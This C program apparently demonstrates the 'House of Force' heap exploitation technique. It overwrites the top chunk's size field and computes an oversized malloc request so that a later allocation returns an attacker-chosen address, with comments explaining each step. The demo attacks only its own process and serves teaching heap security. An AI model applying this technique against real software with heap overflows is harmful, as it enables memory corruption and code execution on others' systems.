#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Attacker will force malloc to return this pointer
char victim[] = "This is victim's string that will returned by malloc";

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

int main() {
  struct chunk_structure *chunk, *top_chunk;
  unsigned long long *ptr;
  size_t requestSize, allotedSize;

  //void *victim = main;

  printf("%p\n", victim);

  // First, request a chunk, so that we can get a pointer to top chunk
  ptr = malloc(256);
  chunk = (struct chunk_structure *)(ptr - 2);
  printf("%p\n", chunk);

  // lower three bits of chunk->size are flags
  allotedSize = chunk->size & ~(0x1 | 0x2 | 0x4);

  // top chunk will be just next to 'ptr'
  top_chunk = (struct chunk_structure *)((char *)chunk + allotedSize);
  printf("%p\n", top_chunk);

  // here, attacker will overflow the 'size' parameter of top chunk
  top_chunk->size = -1;       // Maximum size

  // Might result in an integer overflow, doesn't matter
  requestSize = (size_t)victim            // The target address that malloc should return
                  - (size_t)top_chunk     // The present address of the top chunk
                  - 2*sizeof(long long)   // Size of `size` and `prev_size`
                  - sizeof(long long);    // Additional buffer

  // This also needs to be forced by the attacker
  // This will advance the top_chunk ahead by (requestSize+header+additional buffer)
  // Making it point to `victim`
  printf("%p\n", malloc(requestSize));

  // The top chunk again will service the request and return `victim`
  ptr = malloc(100);
  printf("%p\n", ptr);

  return 0;
}